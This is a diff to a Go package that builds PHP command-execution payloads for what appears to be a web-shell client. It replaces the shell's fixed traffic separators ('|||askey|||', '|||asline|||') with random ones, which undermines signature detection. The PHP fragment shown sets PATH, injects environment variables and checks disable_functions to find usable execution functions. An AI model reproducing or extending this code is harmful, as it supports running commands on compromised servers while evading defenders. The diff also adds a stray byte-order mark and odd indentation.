@@ -1,4 +1,4 @@
-package php
+﻿package php
 
 import (
 	"context"
@@ -243,15 +243,20 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 	binB64 := b64(p.bin)
 	cmdB64 := b64(p.cmd)
 
+
+
+	// 使用随机分隔符替代固定的 |||askey||| / |||asline|||
+	seps := NewSeparators()
+
 	var envStr string
 	if len(p.envars) > 0 {
 		var pairs []string
 		for k, v := range p.envars {
-			pairs = append(pairs, k+"|||askey|||"+v)
+			pairs = append(pairs, k+seps.KeySep+v)
 		}
-		envStr = joinLines(pairs, "|||asline|||")
+		envStr = joinLines(pairs, seps.LineSep)
 	}
-	envB64 := b64(envStr)
+		envB64 := b64(envStr)
 
 	// 构造自包含 PHP 源码：把 base64_decode($_POST['xxx']) 替换成
 	// base64_decode('xxx')，让 eval 直接拿到解码后的值。
@@ -266,7 +271,7 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 		"}else{" +
 		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
 		"}" +
-		"if(!empty($envstr)){$envarr=explode('|||asline|||',$envstr);foreach($envarr as $v){if(!empty($v)){@putenv(str_replace('|||askey|||','=',$v));}}}" +
+		"if(!empty($envstr)){$envarr=explode('" + seps.LineSep + "',$envstr);foreach($envarr as $v){if(!empty($v)){@putenv(str_replace('" + seps.KeySep + "','=',$v));}}}" +
 		"$r=$p.' '.$c;" +
 		"function fe($f){$d=explode(',',@ini_get('disable_functions'));" +
 		"if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}" +
